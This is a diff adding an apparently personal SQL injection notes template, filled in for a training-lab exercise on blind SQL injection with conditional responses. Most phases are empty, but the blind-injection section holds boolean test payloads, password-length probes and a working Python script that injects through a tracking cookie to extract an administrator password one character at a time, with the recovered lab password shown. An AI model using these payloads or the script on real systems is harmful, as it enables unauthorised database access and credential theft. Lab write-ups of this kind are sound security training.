@@ -1,0 +1,119 @@
+==================================================
+SQL INJECTION - TEMPLATE
+==================================================
+
+Date      : 2026-01-02
+Lab       : Blind SQL injection with conditional responses
+URL       : https://0a8e004b031c70f781c7c08000b900c5.web-security-academy.net/
+Objective : log in as the administrator user
+Comment   : based on the lab's description we go to phase 4 directly.
+
+==================================================
+PHASE 1 - DETECTION
+==================================================
+
+[ ] Simple character test
+
+[ ] Simple bypass test
+
+==================================================
+PHASE 2 - IDENTIFICATION
+==================================================
+
+2.1 DBMS type
+
+2.2 Number of columns
+
+2.3 Displayed columns
+
+2.4 Current database
+
+==================================================
+PHASE 3 - EXPLOITATION (UNION-BASED)
+==================================================
+
+3.1 List databases
+
+3.2 List tables (target database)
+
+
+3.3 List columns (target table)
+
+
+3.4 Extract data
+
+
+==================================================
+PHASE 4 - BLIND SQLi (if UNION blocked)
+==================================================
+
+4.1 Boolean-based
+-----------------
+[ ] True/False response test
+    ' AND 1=1--    (normal page)
+         <div>Welcome back!</div>
+    ' AND 1=2--    (different page)
+        due to the description's lab we know that when the "welcome back!" string in the page is not there we have a false condition.
+
+[ ] Password length
+    ' AND LENGTH((SELECT Password FROM Users WHERE Username='Admin'))>10-- 
+    ' AND LENGTH((SELECT Password FROM Users WHERE Username='Admin'))=20--
+
+[ ] Character-by-character extraction
+    We have enough element to create a python script extract.py to extract the password of the administrator user : 
+
+    import requests
+import string
+
+# Configuration
+url = "https://0a8e004b031c70f781c7c08000b900c5.web-security-academy.net/"
+session_cookie = "kD65fsSynGy1kEINE0lVoSGn0DnxDcZV"
+base_tracking_id = "glEnIrDX3pEP9eOH"
+
+# Possible characters 
+charset = string.ascii_lowercase + string.digits  # a-z + 0-9
+
+password = ""
+
+print("[*] Extracting password (20 characters)...\n")
+
+for position in range(1, 21):  # Positions 1 to 20
+    found = False
+    
+    for char in charset:
+        # SQL injection payload
+        payload = f"{base_tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
+        
+        cookies = {
+            "TrackingId": payload,
+            "session": session_cookie
+        }
+        
+        # Send request
+        response = requests.get(url, cookies=cookies)
+        
+        # Check if correct
+        if "Welcome back" in response.text:
+            password += char
+            print(f"[+] Position {position}/20: '{char}' → Current password: {password}")
+            found = True
+            break
+    
+    if not found:
+        print(f"[!] No character found at position {position}")
+        password += "?"
+
+print(f"\n[✓] Complete password: {password}")
+
+Result : [✓] Complete password: mamhb46d00fgktgbu015
+
+==================================================
+PHASE 5 - PRIVILEGE ESCALATION
+==================================================
+
+5.1 File read
+
+5.2 File write
+
+5.3 OS command execution (if available)
+
